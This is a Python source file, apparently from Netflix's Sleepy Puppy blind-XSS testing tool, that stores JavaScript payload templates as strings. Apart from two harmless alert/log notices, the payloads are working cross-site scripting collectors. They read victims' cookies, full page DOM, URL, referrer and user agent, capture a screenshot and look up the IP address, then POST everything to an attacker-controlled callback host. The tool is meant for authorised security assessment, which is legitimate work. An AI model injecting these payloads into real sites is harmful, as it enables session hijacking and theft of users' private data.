#     Copyright 2015 Netflix, Inc.
#
#     Licensed under the Apache License, Version 2.0 (the "License");
#     you may not use this file except in compliance with the License.
#     You may obtain a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#     Unless required by applicable law or agreed to in writing, software
#     distributed under the License is distributed on an "AS IS" BASIS,
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#     See the License for the specific language governing permissions and
#     limitations under the License.
alert_box = r"""
alert('A cross-site scripting payload has fired in your browser, please email security-team@example.com for more information');
"""

console_log = r"""
console.log('A cross-site scripting payload has executed in your browser, please contact security-team@example.com for more information');
"""

generic_collector = r"""
/*
This example shows how you can log arbitrary data to the Generic Collector.
Simply specify the following parameters in your POST request to https://server/generic_collector:

payload: the payload that was triggered in the user's browser.  Use {{payload}} template to fill this in automatically.
assessment: the assessment that is associated with this generic collector.  Use {{assessment}} template to fill this in automatically.
javascript_name: the name of your javascript file that was used to generate the generic collection
data: any data in Text/Json format.  Do not send binary data.
(optional)
uri: If you are using the ALLOWED_DOMAINS filter, you must specify a uri or Sleepy Puppy will not filter the generic collection
*/
function capture() {
    var javascript_name = "Generic Collector: IP Address"
    var uri = document.URL;
    var referrer = document.referrer;
    var payload = {{payload}};
    var assessment = {{assessment}};
            $.ajax({
                url: 'http://ipinfo.io',
                dataType: 'jsonp',
                success: function(stuff) {
                    // call next ajax function
                    $.ajax({
                        type: "POST",
                        url: "{{callback_protocol}}://{{hostname}}/generic_callback",
                        data: {
                            uri: uri,
                            payload: payload,
                            referrer: referrer,
                            javascript_name: javascript_name,
                            data: stuff.ip,
                            assessment: assessment
                        }
                    }).done(function(respond) {
                        console.log(respond);
                    });
                }

            });
        }
//invocation
$(document).ready(capture());
"""

default_without_screenshot = r"""
function capture(){
          var user_agent = navigator.userAgent;
          var uri = document.URL;
          var referrer = document.referrer;
          var cookies = document.cookie;
          var dom = document.documentElement.outerHTML;
          var payload = {{payload}};
          var assessment = {{assessment}};
        $.ajax({
                type: "POST",
                url: "{{callback_protocol}}://{{hostname}}/callbacks",
                data: {
                  uri: uri,
                  payload: payload,
                  referrer: referrer,
                  cookies: cookies,
                  user_agent: user_agent,
                  dom: dom,
                  assessment: assessment
                  }
          }).done(function (respond) {
            console.log(respond);
        });
}
//invocation
$(document).ready(capture());
"""

default_script = r"""
// Html2Canvas is included for taking screenshots
if (typeof (html2canvas) === 'undefined') {
    function getScript(url, success) {
        var script     = document.createElement('script');
        script.src = url;

        var head = document.getElementsByTagName('head')[0],
        done = false;

        // Attach handlers for all browsers
        script.onload = script.onreadystatechange = function () {

            if (!done && (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete')) {
                done = true;
                // callback function provided as param
                success();
                script.onload = script.onreadystatechange = null;
                head.removeChild(script);

            }
        };

        head.appendChild(script);

    }

    getScript('{{callback_protocol}}://{{hostname}}/static/html2canvas.js', function () {
       $(document).ready(capture());
    });

} else {
    $(document).ready(capture());
}

var returnCode;
var Base64Binary = {
    _keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    /* will return a  Uint8Array type */
    decodeArrayBuffer: function(input) {
        var bytes = (input.length/4) * 3;
        var ab = new ArrayBuffer(bytes);
        this.decode(input, ab);

        return ab;
    },

    decode: function(input, arrayBuffer) {
                //get last chars to see if are valid
                var lkey1 = this._keyStr.indexOf(input.charAt(input.length-1));
                var lkey2 = this._keyStr.indexOf(input.charAt(input.length-2));

                var bytes = (input.length/4) * 3;
                if (lkey1 == 64) bytes--; //padding chars, so skip
                if (lkey2 == 64) bytes--; //padding chars, so skip

                var uarray;
                var chr1, chr2, chr3;
                var enc1, enc2, enc3, enc4;
                var i = 0;
                var j = 0;

                if (arrayBuffer)
                    uarray = new Uint8Array(arrayBuffer);
                else
                    uarray = new Uint8Array(bytes);

                input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

                for (i=0; i<bytes; i+=3) {
                        //get the 3 octects in 4 ascii chars
                        enc1 = this._keyStr.indexOf(input.charAt(j++));
                        enc2 = this._keyStr.indexOf(input.charAt(j++));
                        enc3 = this._keyStr.indexOf(input.charAt(j++));
                        enc4 = this._keyStr.indexOf(input.charAt(j++));

                        chr1 = (enc1 << 2) | (enc2 >> 4);
                        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                        chr3 = ((enc3 & 3) << 6) | enc4;

                        uarray[i] = chr1;
                        if (enc3 != 64) uarray[i+1] = chr2;
                        if (enc4 != 64) uarray[i+2] = chr3;
                    }

                    return uarray;
                }
            }

    var screenshot_id = new Date().getTime();

    // Render Canvas Object
    function capture() {
    if (document.documentElement.outerHTML.length > 65535)
    {
        var width_len = 1900;
        var height_len = 1200;
    } else {
        var width_len = null;
        var height_len = null;
    }
      html2canvas(document.body, {
        onrendered: function (canvas) {
          var screenshot = canvas.toDataURL('image/png');
          var user_agent = navigator.userAgent;
          var uri = document.URL;
          var referrer = document.referrer;
          var cookies = document.cookie;
          var dom = document.documentElement.outerHTML;
          var payload = {{payload}};
          var assessment = {{assessment}};
            $.ajax({
                type: "POST",
                url: "{{callback_protocol}}://{{hostname}}/callbacks",
                data: {
                  uri: uri,
                  screenshot: screenshot_id,
                  payload: payload,
                  referrer: referrer,
                  cookies: cookies,
                  user_agent: user_agent,
                  dom: dom,
                  assessment: assessment
              }
          }).done(function (respond) {
            console.log(respond);
        });

    // Set JS prototype for Binary uploads
    if ( XMLHttpRequest.prototype.sendAsBinary === undefined ) {
        XMLHttpRequest.prototype.sendAsBinary = function(string) {
            var bytes = Array.prototype.map.call(string, function(c) {
                return c.charCodeAt(0) & 0xff;
            });
            this.send(new Uint8Array(bytes).buffer);
        };
    }

    // Prepare image for upload
    var encodedPng = screenshot.substring(screenshot.indexOf(',')+1,screenshot.length);
    var decodedPng = Base64Binary.decode(encodedPng);
    var boundary = '----ThisIsDeadBeef1234567890';

    // let's encode our image file, which is contained in the var
    var formData = '--' + boundary + '\r\n';
    formData += 'Content-Disposition: form-data; name="file"; filename="' + screenshot_id + '.png' + '"\r\n';
    formData += 'Content-Type: ' + "image/png" + '\r\n\r\n';
    for ( var i = 0; i < decodedPng.length; ++i )
    {
        formData += String.fromCharCode( decodedPng[ i ] & 0xff );
    }
    formData += '\r\n';
    formData += '--' + boundary + '--\r\n';

    var xhr = new XMLHttpRequest();
    xhr.open( 'POST', '{{callback_protocol}}://{{hostname}}/up', true );
    xhr.onload = xhr.onerror = function() {
        console.log( xhr.responseText );
    };
    xhr.setRequestHeader( "Content-Type", "multipart/form-data; boundary=" + boundary );
    xhr.sendAsBinary( formData );
    console.log('success');
    returnCode = 'success';
},
width: width_len,
height: height_len
});
}
"""
